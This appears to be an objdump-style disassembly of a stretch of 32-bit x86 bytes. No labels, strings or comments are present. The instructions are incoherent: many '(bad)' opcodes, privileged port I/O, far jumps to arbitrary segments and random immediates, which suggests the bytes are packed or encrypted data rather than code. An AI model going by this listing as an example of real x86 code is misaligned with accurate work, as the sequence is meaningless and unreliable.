  4215b2:	push   ebp
  4215b3:	enter  0x3248,0xb7
  4215b7:	ins    DWORD PTR es:[edi],dx
  4215b8:	sbb    ebp,eax
  4215ba:	xor    eax,0xad437bb4
  4215bf:	mov    ds:0x886de274,al
  4215c4:	dec    edx
  4215c5:	rol    DWORD PTR [ebp+0x69b675db],1
  4215cb:	ds push ebx
  4215cd:	and    BYTE PTR [esi-0x26fe7ce2],ch
  4215d3:	idiv   eax
  4215d5:	loopne 0x421612
  4215d7:	mov    ch,BYTE PTR [esi+0x350ea99]
  4215dd:	mov    ch,0x6a
  4215df:	adc    eax,0x60659cf
  4215e4:	push   ecx
  4215e5:	fnstcw WORD PTR [edi+edx*1-0x4690ec1b]
  4215ec:	push   ecx
  4215ed:	add    BYTE PTR [esi+ecx*8+0x72546187],ah
  4215f4:	xchg   ebp,eax
  4215f5:	cmp    BYTE PTR [esi-0x52ba1d2c],dh
  4215fb:	push   ds
  4215fc:	add    al,0x9f
  4215fe:	jnp    0x4215ee
  421600:	std    
  421601:	jne    0xd253aa1d
  421607:	std    
  421608:	aaa    
  421609:	add    BYTE PTR [eax+ebp*1],dh
  42160c:	sub    al,BYTE PTR [edx]
  42160e:	outs   dx,BYTE PTR ds:[esi]
  42160f:	es pop esp
  421611:	out    0xac,eax
  421613:	cmp    edi,edx
  421615:	pop    edx
  421616:	jne    0x421647
  421618:	dec    esi
  421619:	dec    edx
  42161a:	sar    BYTE PTR [esi-0x1a501b3e],1
  421620:	sub    DWORD PTR [edi],eax
  421622:	cli    
  421623:	add    al,0x53
  421625:	inc    eax
  421626:	(bad)  
  421627:	push   cs
  421628:	inc    ebx
  421629:	ins    BYTE PTR es:[edi],dx
  42162a:	xchg   ebx,eax
  42162b:	in     eax,0x46
  42162d:	rcr    DWORD PTR [ecx-0x32],cl
  421630:	shl    BYTE PTR [ecx],cl
  421632:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421633:	pop    edi
  421634:	cmp    al,0xa8
  421636:	add    al,ch
  421638:	rol    DWORD PTR es:[ebx+0x2ff50ed1],1
  42163f:	mov    eax,ds:0xfd573fde
  421644:	imul   eax,DWORD PTR [ebx+0x57],0x7c
  421648:	jle    0x421687
  42164a:	test   ebp,eax
  42164c:	lock leave 
  42164e:	ins    DWORD PTR es:[edi],dx
  42164f:	mov    gs:0xf30ba869,al
  421655:	daa    
  421656:	loope  0x4215da
  421658:	sbb    dh,ch
  42165a:	mov    ecx,fs
  42165c:	fcomp  st(7)
  42165e:	nop
  42165f:	xchg   ecx,eax
  421660:	cmp    al,0x43
  421662:	mov    ah,0x85
  421664:	je     0x4215fa
  421666:	test   esp,0x14e6bddd
  42166c:	out    dx,eax
  42166d:	in     al,0x6b
  42166f:	popa   
  421670:	jo     0x42165c
  421672:	gs add al,0xf0
  421675:	(bad)  
  421676:	cmp    al,0x5b
  421678:	out    dx,al
  421679:	out    dx,eax
  42167a:	lods   al,BYTE PTR ds:[esi]
  42167b:	pop    edi
  42167c:	push   edx
  42167d:	imul   eax,eax,0xe037962e
  421683:	std    
  421684:	mov    ch,0xe6
  421686:	mov    bh,0xae
  421688:	jne    0x421700
  42168a:	shr    DWORD PTR [ebx-0x2d],cl
  42168d:	pop    eax
  42168e:	inc    ecx
  42168f:	test   eax,0xb128f707
  421694:	test   al,0x6b
  421696:	pop    edi
  421697:	sar    BYTE PTR [eax-0xf],1
  42169a:	stc    
  42169b:	stos   BYTE PTR es:[edi],al
  42169c:	shl    DWORD PTR [ecx+eiz*2],0xc6
  4216a0:	out    dx,eax
  4216a1:	rcr    ebx,0x3e
  4216a4:	ins    BYTE PTR es:[edi],dx
  4216a5:	ja     0x4216db
  4216a7:	test   ah,0x56
  4216aa:	or     al,0xa4
  4216ac:	ja     0x4216d9
  4216ae:	pop    ss
  4216af:	in     eax,dx
  4216b0:	sbb    eax,0xe0504c65
  4216b5:	mov    ebx,0x14ce61b4
  4216ba:	jl     0x4216c5
  4216bc:	mov    eax,0xfb2565ad
  4216c1:	int    0x79
  4216c3:	dec    esi
  4216c4:	push   edx
  4216c5:	mov    esp,0x22e8e4bf
  4216ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216cb:	mov    esp,DWORD PTR [ebx+ebx*4]
  4216ce:	pop    ds
  4216cf:	push   esi
  4216d0:	shr    eax,0x17
  4216d3:	xchg   ebx,eax
  4216d4:	jbe    0x421713
  4216d6:	(bad)  
  4216d7:	stos   BYTE PTR es:[edi],al
  4216d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216d9:	inc    ebp
  4216da:	ror    DWORD PTR [edi-0x77],0x85
  4216de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216df:	and    al,0xc0
  4216e1:	inc    eax
  4216e2:	dec    eax
  4216e3:	bound  edx,QWORD PTR [ebp-0x8a6f16b]
  4216e9:	push   cs
  4216ea:	push   edx
  4216eb:	mov    eax,ds:0x683520ec
  4216f0:	add    edx,DWORD PTR [edx]
  4216f2:	sub    BYTE PTR [esi],al
  4216f4:	stc    
  4216f5:	inc    edx
  4216f6:	push   esi
  4216f7:	pop    eax
  4216f8:	int    0x9f
  4216fa:	jecxz  0x42168d
  4216fc:	mov    bh,0x7e
  4216fe:	mov    dl,0xea
  421700:	jle    0x4216c5
  421702:	cli    
  421703:	ffreep st(2)
  421705:	outs   dx,DWORD PTR ds:[esi]
  421706:	sub    BYTE PTR [esi],al
  421708:	out    dx,eax
  421709:	fld    TBYTE PTR [esi]
  42170b:	dec    ecx
  42170c:	lea    eax,[ebp+eax*2-0x241df345]
  421713:	sti    
  421714:	(bad)  
  421716:	std    
  421717:	shl    DWORD PTR [edi+ebx*8],1
  42171a:	mov    ds:0x5dc017f0,al
  42171f:	not    DWORD PTR [eax]
  421721:	inc    edx
  421722:	repnz or DWORD PTR [eax-0x2],0x7d2cb3ff
  42172a:	pop    edi
  42172b:	dec    ecx
  42172c:	sub    al,BYTE PTR [eax]
  42172e:	xor    al,0x40
  421730:	push   edx
  421731:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421732:	fsubrp st(2),st
  421734:	jp     0x421740
  421736:	add    eax,0x6fc7be8d
  42173b:	pop    es
  42173c:	jl     0x421724
  42173e:	xchg   ebx,eax
  42173f:	mov    eax,0x2b2c3424
  421744:	mov    bl,0xaa
  421746:	(bad)  
  421747:	sbb    esi,DWORD PTR [edx-0x6c]
  42174a:	adc    eax,0xbc807d24
  42174f:	test   DWORD PTR [ecx],eax
  421751:	pop    eax
  421752:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421753:	push   esp
  421754:	push   es
  421755:	mov    ah,0xd9
  421757:	imul   edx,DWORD PTR [ebp+0x4e8be12f],0xf94bc51e
  421761:	pusha  
  421762:	add    DWORD PTR [eax],ebx
  421764:	scas   eax,DWORD PTR es:[edi]
  421765:	test   DWORD PTR [eax],ebx
  421767:	xlat   BYTE PTR ds:[ebx]
  421768:	push   0xffffffc2
  42176a:	repz adc ecx,eax
  42176d:	push   edx
  42176e:	mov    al,ds:0x70002d00
  421773:	add    bh,BYTE PTR [esi-0x59e94dbc]
  421779:	xchg   ebp,eax
  42177a:	test   BYTE PTR [ebp+0x11],bl
  42177d:	push   ebp
  42177e:	or     DWORD PTR [eax-0x1b],edi
  421781:	and    ebx,DWORD PTR [ecx+0x3a]
  421784:	jns    0x4217b5
  421786:	ret    
  421787:	sar    DWORD PTR [esi],cl
  421789:	mov    al,ds:0xf86bfec7
  42178e:	xor    BYTE PTR [ebx+ebp*8-0x37],ch
  421792:	mov    ds,WORD PTR gs:[di]
  421796:	cmp    dl,BYTE PTR [esi-0x2c52fcc8]
  42179c:	ret    0x540d
  42179f:	mov    bl,0x36
  4217a1:	ja     0x4217e3
  4217a3:	ins    BYTE PTR es:[edi],dx
  4217a4:	jl     0x421801
  4217a6:	neg    ecx
  4217a8:	pushf  
  4217a9:	xor    DWORD PTR [edi-0x64edfa78],ebp
  4217af:	or     ch,BYTE PTR [ebx]
  4217b1:	push   ss
  4217b2:	add    ecx,edx
  4217b4:	sub    bh,dl
  4217b6:	pusha  
  4217b7:	std    
  4217b8:	mov    esi,0x81183a9a
  4217bd:	test   al,0xf7
  4217bf:	push   eax
  4217c0:	js     0x421817
  4217c2:	rol    DWORD PTR [esi+0x6a],cl
  4217c5:	jmp    0xdc27f2fa
  4217ca:	pop    esp
  4217cb:	mov    WORD PTR [ebx],?
  4217cd:	adc    eax,0xa8ae1d88
  4217d2:	std    
  4217d3:	mov    ds:0x868eabef,al
  4217d8:	outs   dx,BYTE PTR ds:[esi]
  4217d9:	out    0xf7,al
  4217db:	mov    edi,DWORD PTR [ebx-0x7d]
  4217de:	xor    al,0x32
  4217e0:	cmp    dh,BYTE PTR [edi+ecx*4]
  4217e3:	std    
  4217e4:	xor    DWORD PTR [ebx+0x6207ba28],ebx
  4217ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217eb:	out    dx,al
  4217ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217ed:	ret    
  4217ee:	or     eax,0x573e26c4
  4217f3:	das    
  4217f4:	and    cl,ah
  4217f6:	sar    esp,1
  4217f8:	jmp    0x9b8a:0xb9274ba2
  4217ff:	je     0x4217d0
  421801:	cmp    cl,ah
  421803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421804:	or     DWORD PTR [ebx+0x61],0x20f44133
  42180b:	cmp    eax,0xe805f6f
  421810:	sub    DWORD PTR [esi-0x73],eax
  421813:	aas    
  421814:	pusha  
  421815:	aam    0x3
  421817:	pop    edi
  421818:	adc    ebp,DWORD PTR [ebp+0x6dd28bc3]
  42181e:	mov    esi,0x7888c7dd
  421823:	jb     0x42187f
  421825:	or     ah,BYTE PTR [edi]
  421827:	dec    ebx
  421828:	pop    esi
  421829:	jmp    0x4217b7
  42182b:	jbe    0x421880
  42182d:	inc    eax
  42182e:	aam    0x91
  421830:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421831:	sbb    al,0x6b
  421833:	jg     0x421847
  421835:	and    bl,cl
  421837:	sbb    DWORD PTR [edx+0x6039e3a9],eax
  42183d:	data16 (bad) 
  421840:	or     DWORD PTR [edi],eax
  421842:	mov    eax,ds:0x45e818e4
  421847:	data16 and BYTE PTR [esi+ecx*1+0x3a6ff219],al
  42184f:	jmp    0x2d01:0xf1a7d462
  421856:	fisub  DWORD PTR [edx]
  421858:	add    eax,0x555fc96d
  42185d:	imul   edi,edi,0x227c9090
  421863:	cwde   
  421864:	ret    
  421865:	das    
  421866:	dec    edi
  421867:	mov    bl,0x21
  421869:	add    dl,BYTE PTR [ecx+0x63a79546]
  42186f:	ret    0xe411
  421872:	mov    ch,0x8c
  421874:	adc    BYTE PTR [eax-0x39],bl
  421877:	out    dx,al
  421878:	sub    al,0xb9
  42187a:	mov    es,edi
  42187c:	adc    al,BYTE PTR [ecx+0x7e]
  42187f:	fsubr  QWORD PTR [esi-0x5d]
  421882:	mov    ebx,0x3718b925
  421887:	pushf  
  421888:	in     eax,0x9c
  42188a:	test   al,0x73
  42188c:	in     eax,dx
  42188d:	xor    DWORD PTR [ebp-0x13],ebp
  421890:	mov    edi,0x34ba0d8f
  421895:	xchg   ecx,eax
  421896:	(bad)  
  421897:	call   DWORD PTR [ebx]
  421899:	retf   
  42189a:	inc    ebp
  42189b:	fisubr DWORD PTR [esi+ebp*1-0x42]
  42189f:	(bad)
  4218a2:	shr    BYTE PTR [esi-0x36],cl
  4218a5:	sbb    BYTE PTR [ecx-0xe],0xd0
  4218a9:	mov    eax,ds:0x16fe7842
  4218ae:	inc    ecx
  4218af:	dec    esi
  4218b0:	cmp    ch,BYTE PTR [esi]
  4218b2:	mov    edi,0x3dacfa71
  4218b7:	std    
  4218b8:	pop    ds
  4218b9:	jmp    0x5dd90fef
  4218be:	inc    edx
  4218bf:	jns    0x4218f7
  4218c1:	push   ebx
  4218c2:	mov    bh,BYTE PTR [edi]
  4218c4:	sub    eax,ebx
  4218c6:	xchg   esp,eax
  4218c7:	pop    esi
  4218c8:	jp     0x421907
  4218ca:	mov    DWORD PTR [ecx-0x37],edx
  4218cd:	in     al,0x8e
  4218cf:	xchg   ebp,eax
  4218d0:	in     al,dx
  4218d1:	popa   
  4218d2:	lods   al,BYTE PTR ds:[esi]
  4218d3:	arpl   WORD PTR [ebp+0x25],di
  4218d6:	out    0xc4,eax
  4218d8:	jns    0x42191f
  4218da:	pop    edi
  4218db:	and    eax,0xfa442c61
  4218e0:	pop    esi
  4218e1:	jle    0x4218ff
  4218e3:	call   0xd97bfe4e
  4218e8:	push   cs
  4218e9:	test   ebx,ebx
  4218eb:	jle    0x42189c
  4218ed:	pop    edi
  4218ee:	xchg   edi,eax
  4218ef:	jnp    0x4218d1
  4218f1:	cmp    al,0xd6
  4218f3:	test   BYTE PTR ds:0x6fbd7952,al
  4218f9:	fadd   QWORD PTR [ebx-0x63]
  4218fc:	push   ss
  4218fd:	mov    ah,0x24
  4218ff:	rcr    BYTE PTR [eax-0x18],1
  421902:	clc    
  421903:	adc    ebp,DWORD PTR [edi+ebx*1+0x6cfd8e1]
  42190a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42190b:	pop    ss
  42190c:	mov    ds:0xfa6e6f31,al
  421911:	pop    ecx
  421912:	add    DWORD PTR [esi+0x47],0x6a
  421916:	bound  edx,QWORD PTR [ebp+ecx*1+0x596ff7b1]
  42191d:	repz aas 
  42191f:	out    dx,al
  421920:	xchg   edx,eax
  421921:	or     ah,dl
  421923:	pop    es
  421924:	fdivr  st(6),st
  421926:	data16 into 
  421928:	and    al,0xc3
  42192a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42192b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42192c:	jmp    0x5b94eb55
  421931:	fdivr  st(2),st
  421933:	mov    dh,0xfa
  421935:	test   eax,0x6462beb3
  42193a:	sub    al,BYTE PTR [ebp-0x34]
  42193d:	push   edx
  42193e:	(bad)  
  42193f:	jmp    0x6c34:0x8f85955d
  421946:	pop    ss
  421947:	add    al,0xad
  421949:	jo     0x4219a0
  42194b:	cmp    DWORD PTR [esi+eax*1],edi
  42194e:	fwait
  42194f:	cwde   
  421950:	jno    0x421943
  421952:	add    ebp,DWORD PTR [edx-0x7c]
  421955:	enter  0x4d87,0xe6
  421959:	and    DWORD PTR [ebp+0x3d],esi
  42195c:	(bad)  
  42195d:	out    dx,eax
  42195e:	loopne 0x421967
  421960:	and    al,0xcf
  421962:	jecxz  0x421999
  421964:	(bad)  
  421965:	fst    DWORD PTR [edi-0x2a03c356]
  42196b:	mov    edi,0x19d4b6ca
  421970:	ins    BYTE PTR es:[edi],dx
  421971:	cmp    BYTE PTR [esi+0x748b5f45],ah
  421977:	mov    edx,0x22da2aa0
  42197c:	or     DWORD PTR [eax-0x2e4dd767],esp
  421982:	push   es
  421983:	imul   ebx,DWORD PTR [ecx],0x14
  421986:	xlat   BYTE PTR ds:[ebx]
  421987:	mov    dh,0x7
  421989:	push   ebp
  42198a:	int    0x7
  42198c:	pushf  
  42198d:	or     al,0x46
  42198f:	xor    al,0x15
  421991:	mov    eax,0xbcbe2b6f
  421996:	(bad)  
  421998:	add    BYTE PTR [ebp+eax*2-0x47],bl
  42199c:	add    al,0x3a
  42199e:	mov    ebp,0x8173b180
  4219a3:	in     eax,dx
  4219a4:	enter  0xfd3,0x44
  4219a8:	rcl    BYTE PTR [ecx+0x4e],0x4f
  4219ac:	jecxz  0x421986
  4219ae:	sbb    DWORD PTR [eax+0x1730ba95],0xa48a083c
  4219b8:	lds    edi,FWORD PTR [ebx+0x15]
  4219bb:	dec    ebx
  4219bc:	mov    BYTE PTR [edi+0x5a],dh
  4219bf:	sbb    BYTE PTR [edx-0x5746e690],bh
  4219c5:	inc    esi
  4219c6:	repnz ins BYTE PTR es:[edi],dx
  4219c8:	mov    BYTE PTR [ebx-0x54],dl
  4219cb:	and    al,0x23
  4219cd:	mov    esp,0x496a6b16
  4219d2:	(bad)  
  4219d3:	xchg   ebx,eax
  4219d4:	addr16 dec edx
  4219d6:	pop    ebp
  4219d7:	fs add eax,0xb8eb3153
  4219dd:	cmp    bh,BYTE PTR [ebx-0x37]
  4219e0:	imul   esp,DWORD PTR [ebx+0x43],0x4b
  4219e4:	mov    esp,0x8f160f1f
  4219e9:	pushf  
  4219ea:	les    esp,FWORD PTR [eax-0x498d15c4]
  4219f0:	les    edi,FWORD PTR [edx+0x38]
  4219f3:	jmp    0x304c:0x65a3a483
  4219fa:	dec    esi
  4219fb:	cs sahf 
  4219fd:	sar    DWORD PTR [esi],cl
  4219ff:	shl    BYTE PTR [ebx+edx*4+0x7e],cl
  421a03:	daa    
  421a04:	aas    
  421a05:	or     al,0xdf
  421a07:	pusha  
  421a08:	pushf  
  421a09:	mov    eax,0x3e6cc4c9
  421a0e:	or     al,0x9
  421a10:	dec    eax
  421a11:	cmp    DWORD PTR [ebp+edx*1+0x59],edi
  421a15:	jns    0x421a2c
  421a17:	int    0x8f
  421a19:	dec    ecx
  421a1a:	jno    0x421a00
  421a1c:	dec    eax
  421a1d:	outs   dx,DWORD PTR ds:[esi]
  421a1e:	push   esi
  421a1f:	test   al,0x2a
  421a21:	add    dh,ah
  421a23:	xor    eax,eax
  421a25:	test   DWORD PTR [eax-0x62],edx
  421a28:	jg     0x421a2d
  421a2a:	arpl   WORD PTR [ecx+0x4e],sp
  421a2d:	fs out dx,eax
  421a2f:	and    DWORD PTR [edi],eax
  421a31:	sub    BYTE PTR [esi+esi*1],bl
  421a34:	cs popa 
  421a36:	dec    ebp
  421a37:	sbb    dh,cl
  421a39:	jle    0x421a6c
  421a3b:	js     0x4219db
  421a3d:	cmp    BYTE PTR [ebx-0x48],0xb2
  421a41:	mov    al,0x91
  421a43:	clc    
  421a44:	dec    DWORD PTR [edx-0x7cdc6b3e]
  421a4a:	xchg   edi,eax
  421a4b:	aaa    
  421a4c:	fistp  WORD PTR [ebp-0x4f]
  421a4f:	cmc    
  421a50:	lea    esi,[eax+ebx*1-0x32524d0c]
  421a57:	das    
  421a58:	lds    edx,FWORD PTR [esp+edx*1+0x409cf137]
  421a5f:	inc    ebp
  421a60:	mov    ds:0x115a7ea5,al
  421a65:	test   BYTE PTR [edi+0x3e],bh
  421a68:	push   ecx
  421a69:	mov    esp,0x6d938819
  421a6e:	mov    dl,0x77
  421a70:	ror    BYTE PTR [ecx+edi*8],cl
  421a73:	sub    esi,edx
  421a75:	test   eax,0x9d266f76
  421a7a:	lock pop esp
  421a7c:	imul   edi,DWORD PTR [eax-0x7a455e3e],0xffffffcf
  421a83:	or     BYTE PTR [ebx-0x68],ah
  421a86:	adc    eax,0x398ee4ea
  421a8b:	mov    bh,0xf9
  421a8d:	lods   eax,DWORD PTR ds:[esi]
  421a8e:	mov    ch,0x33
  421a90:	jb     0x421a98
  421a92:	loop   0x421ada
  421a94:	popa   
  421a95:	dec    ebp
  421a96:	lock stc 
  421a98:	mov    bl,0x8f
  421a9a:	adc    ebp,DWORD PTR [edi]
  421a9c:	mov    edi,0x8962cbb9
  421aa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421aa2:	jb     0x421a93
  421aa4:	out    dx,al
  421aa5:	(bad)  [ebx-0x39407d5a]
  421aab:	les    ebx,FWORD PTR [eax]
  421aad:	jmp    0x6024:0xf1adb8bf
  421ab4:	xor    ebx,DWORD PTR [edx+0x5]
  421ab7:	adc    ebp,edi
  421ab9:	sub    al,0xb3
  421abb:	dec    ebp
  421abc:	or     edi,0x85a40805
  421ac2:	adc    DWORD PTR [esi+0x7710c7c4],ecx
  421ac8:	push   ebp
  421ac9:	std    
  421aca:	pushf  
  421acb:	xchg   esi,eax
  421acc:	pusha  
  421acd:	out    dx,eax
  421ace:	inc    edi
  421acf:	inc    edx
  421ad0:	imul   BYTE PTR ds:0x39ccf177
  421ad6:	mov    al,0xd
  421ad8:	(bad)  
  421ad9:	cld    
  421ada:	int3   
  421adb:	fsub   DWORD PTR [ebx-0x23]
  421ade:	dec    esi
  421adf:	out    0x4e,eax
  421ae1:	push   ds
  421ae2:	adc    eax,0x44865b94
  421ae7:	push   0x590b4af
  421aec:	mov    dl,BYTE PTR [edx-0x22edad5a]
  421af2:	pop    ss
  421af3:	dec    edx
  421af4:	aas    
  421af5:	inc    edi
  421af6:	or     eax,DWORD PTR [ebx]
  421af8:	xlat   BYTE PTR ds:[ebx]
  421af9:	push   ebx
  421afa:	jbe    0x421abf
  421afc:	std    
  421afd:	jmp    0x841c:0xbab219d9
  421b04:	ret    0xe80d
  421b07:	js     0x421b60
  421b09:	add    dh,BYTE PTR [eax+0x7f21a83e]
  421b0f:	sahf   
  421b10:	mov    ebx,0xf2cd28b3
  421b15:	pusha  
  421b16:	in     al,0xec
  421b18:	(bad)  
  421b19:	xlat   BYTE PTR ds:[ebx]
  421b1a:	int    0xa4
  421b1c:	pop    ebx
  421b1d:	pop    edi
  421b1e:	popf   
  421b1f:	ins    DWORD PTR es:[edi],dx
  421b20:	mov    ch,0x4f
  421b22:	int    0x72
  421b24:	push   cx
  421b26:	cmp    ah,BYTE PTR [eax+ebx*1+0x56]
  421b2a:	and    al,0xd4
  421b2c:	inc    esp
  421b2d:	clc    
  421b2e:	sub    bh,dl
  421b30:	or     al,0x7e
  421b32:	ins    DWORD PTR es:[edi],dx
  421b33:	or     esp,DWORD PTR [edx+0x325c40b8]
  421b39:	nop
  421b3a:	into   
  421b3b:	mov    DWORD PTR [ebx],0x4aac4f9b
  421b41:	push   es
  421b42:	into   
  421b43:	sub    esi,DWORD PTR [ecx-0x11]
  421b46:	xchg   edx,eax
  421b47:	pop    es
  421b48:	sub    ah,bl
  421b4a:	add    al,0xc2
  421b4c:	mov    ebx,0x22a07f3e
  421b51:	sub    DWORD PTR [edx],ebp
  421b53:	inc    esi
  421b54:	inc    esi
  421b55:	push   es
  421b56:	sub    BYTE PTR [eax+0x61],dl
  421b59:	sub    ah,0xb9
  421b5c:	in     al,dx
  421b5d:	adc    al,0x87
  421b5f:	or     al,0x70
  421b61:	adc    DWORD PTR [ebp-0x4e60c914],0x261056e7
  421b6b:	in     al,dx
  421b6c:	mov    ebp,0x7a0ca667
  421b71:	imul   edx,DWORD PTR [eax-0x79],0x3e45892b
  421b78:	pop    ebp
  421b79:	imul   BYTE PTR [ecx]
  421b7b:	(bad)  
  421b7c:	mov    dl,0xdc
  421b7e:	adc    BYTE PTR [edx+0x3e6b73c0],dh
  421b84:	mov    edi,0x85e8fd3a
  421b89:	add    eax,0xa4dc2b29
  421b8e:	jmp    0x421b7d
  421b90:	xchg   ebp,eax
  421b91:	push   eax
  421b92:	push   0xffffffab
  421b94:	pop    eax
  421b95:	ins    BYTE PTR es:[edi],dx
  421b96:	iret   
  421b97:	jae    0x421ba3
  421b99:	data16 mov dl,al
  421b9c:	add    ch,BYTE PTR [eax+0xcb625a4]
  421ba2:	call   0xb3:0x7fe81ea1
  421ba9:	clc    
  421baa:	sar    ebx,1
  421bac:	aam    0x1c
  421bae:	mov    ch,0xb0
  421bb0:	sub    al,0x2a
  421bb2:	popa   
  421bb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421bb4:	(bad)  
  421bb5:	and    ebp,0xbbbe23a6
  421bbb:	sub    al,0xd8
  421bbd:	test   eax,0x8c4c678b
  421bc2:	xchg   esp,eax
  421bc3:	aaa    
  421bc4:	clc    
  421bc5:	cmp    BYTE PTR [eax-0x6b],0x57
  421bc9:	add    al,bh
  421bcb:	adc    eax,0x7ecc2451
  421bd0:	aad    0xff
  421bd2:	daa    
  421bd3:	stc    
  421bd4:	scas   eax,DWORD PTR es:[edi]
  421bd5:	popa   
  421bd6:	xchg   al,bl
  421bd8:	mov    ecx,0xdafc64f0
  421bdd:	mov    cl,0x4b
  421bdf:	sub    dl,cl
  421be1:	dec    edi
  421be2:	jge    0x421c0b
  421be4:	ficom  WORD PTR [ebx+0x2bc8bf1f]
  421bea:	jno    0x421bde
  421bec:	inc    eax
  421bed:	inc    esi
  421bee:	xchg   edi,eax
  421bef:	or     ecx,DWORD PTR [ebx]
  421bf1:	dec    ebp
  421bf2:	(bad)
  421bf6:	or     eax,0x66e34ca3
  421bfb:	pop    ebx
  421bfc:	mov    DWORD PTR [eax+ebp*2-0x6fbcd41a],0x475f0895
  421c07:	je     0x421bae
  421c09:	push   es
  421c0a:	push   esi
  421c0b:	inc    ebx
  421c0c:	pop    edx
  421c0d:	pop    ecx
  421c0e:	pop    edi
  421c0f:	pop    ecx
  421c10:	push   edi
  421c11:	dec    edi
  421c12:	mov    fs,WORD PTR [ecx+0x2c4be972]
  421c18:	adc    dh,BYTE PTR [eax+0x1ab08]
  421c1e:	mov    BYTE PTR [esi],al
  421c20:	add    BYTE PTR [eax],al
  421c22:	adc    eax,0xd399c5f1
  421c27:	dec    esp
  421c28:	hlt    
  421c29:	imul   esp,edi,0x6
  421c2c:	shr    BYTE PTR [esi-0x14a0c7bc],1
  421c32:	gs push 0xc
  421c35:	popa   
  421c36:	loop   0x421c9d
  421c38:	add    esi,DWORD PTR [edi]
  421c3a:	fdiv   DWORD PTR [ebx+0x787c9b68]
  421c40:	inc    eax
  421c41:	xor    al,0xc6
  421c43:	or     bl,BYTE PTR [eax]
  421c45:	dec    ecx
  421c46:	xchg   ecx,eax
  421c47:	add    BYTE PTR [esi+eiz*4],ah
  421c4a:	sbb    ebx,DWORD PTR [edx+0x1f]
  421c4d:	mov    ah,0xd7
  421c4f:	xor    eax,DWORD PTR [ecx+esi*1-0x2c12665b]
  421c56:	(bad)  
  421c57:	cs inc ebp
  421c59:	xchg   ebp,eax
  421c5a:	call   0x5a42865d
  421c5f:	stos   BYTE PTR es:[edi],al
  421c60:	or     BYTE PTR [ebx+0x28aacc51],bl
  421c66:	mov    al,ds:0x119b92a2
  421c6b:	popf   
  421c6c:	out    0x65,eax
  421c6e:	gs push edi
  421c70:	xor    eax,0xa09e6635
  421c75:	std    
  421c76:	(bad)  
  421c77:	jmp    0x2008:0x611696e1
  421c7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c7f:	mov    dl,0x8f
  421c81:	push   ebx
  421c82:	(bad)  
  421c83:	in     eax,dx
  421c84:	mov    ch,BYTE PTR [esi]
  421c86:	mov    ah,0x5d
  421c88:	xor    eax,0x1e80ee53
  421c8d:	pop    edi
  421c8e:	add    DWORD PTR [edx-0x7590231c],0x382b5bab
  421c98:	ds shl ebp,cl
  421c9b:	mov    eax,0xb2572aa4
  421ca0:	fistp  DWORD PTR [ecx-0x588fd06c]
  421ca6:	xchg   edx,eax
  421ca7:	and    BYTE PTR [edi+0xd],0x3
  421cab:	pushf  
  421cac:	xor    al,0x80
  421cae:	mov    edx,0xdcd60878
  421cb3:	gs cmc 
  421cb5:	jae    0x421d01
  421cb7:	loop   0x421d0c
  421cb9:	mov    dh,0xb6
  421cbb:	leave  
  421cbc:	sbb    DWORD PTR [ecx-0x1],0xffffff87
  421cc0:	sub    al,0x13
  421cc2:	add    DWORD PTR [edx-0xc],0x4a0da865
  421cc9:	les    eax,FWORD PTR [eax+0x6fd9c9ba]
  421ccf:	inc    esp
  421cd0:	cmp    esp,DWORD PTR [ebx-0x6d]
  421cd3:	xor    DWORD PTR [edx+0x55],edi
  421cd6:	dec    edi
  421cd7:	push   es
  421cd8:	pop    ecx
  421cd9:	aas    
  421cda:	cmp    eax,0x7c9b4f0f
  421cdf:	xchg   esp,eax
  421ce0:	cmp    ecx,DWORD PTR [edi+0x4c]
  421ce3:	and    bh,BYTE PTR [ebp-0x10]
  421ce6:	cs daa 
  421ce8:	sbb    cl,BYTE PTR [ebp+ecx*8-0x6f]
  421cec:	add    ebx,DWORD PTR [ebx-0x6b]
  421cef:	mov    ecx,0xed76c0d
  421cf4:	dec    ecx
  421cf5:	fsubr  DWORD PTR [ebx-0x3a07e1f9]
  421cfb:	je     0x421ce1
  421cfd:	fild   WORD PTR [ecx-0x7e]
  421d00:	test   cl,ch
  421d02:	outs   dx,BYTE PTR ds:[esi]
  421d03:	lahf   
  421d04:	sbb    DWORD PTR [ebp+0x4c3642a4],esp
  421d0a:	xor    edx,ebp
  421d0c:	neg    BYTE PTR [edi-0x1e]
  421d0f:	push   eax
  421d10:	add    dh,cl
  421d12:	mov    al,0x11
  421d14:	sub    esi,ebp
  421d16:	push   esi
  421d17:	dec    edi
  421d18:	fwait
  421d19:	add    DWORD PTR es:[ecx],eax
  421d1c:	call   0x8b7a:0x1c146984
  421d23:	mov    esp,0xc094452c
  421d28:	jo     0x421caa
  421d2a:	jb     0x421cf5
  421d2c:	mov    DWORD PTR [edi-0x5a6b2c64],esp
  421d32:	ins    BYTE PTR es:[edi],dx
  421d33:	js     0x421d8f
  421d35:	js     0x421d57
  421d37:	leave  
  421d38:	mov    ah,0x7d
  421d3a:	jo     0x421d65
  421d3c:	call   0xb16cfc12
  421d41:	mov    BYTE PTR [edx-0x57ebfc96],cl
  421d47:	xchg   BYTE PTR [ebx-0x45e14297],al
  421d4d:	adc    al,0x58
  421d4f:	mov    BYTE PTR [edx-0x2295a969],0x6
  421d56:	sub    al,0x6e
  421d58:	adc    eax,DWORD PTR [edi-0x4a]
  421d5b:	mul    eax
  421d5d:	cmp    BYTE PTR [esi-0x37],ah
  421d60:	imul   edx,DWORD PTR [ebx+0x1b],0x181a0d93
  421d67:	lods   al,BYTE PTR ds:[si]
  421d69:	push   edx
  421d6a:	fstp   QWORD PTR [ecx-0x63]
  421d6d:	cmc    
  421d6e:	daa    
  421d6f:	stos   BYTE PTR es:[edi],al
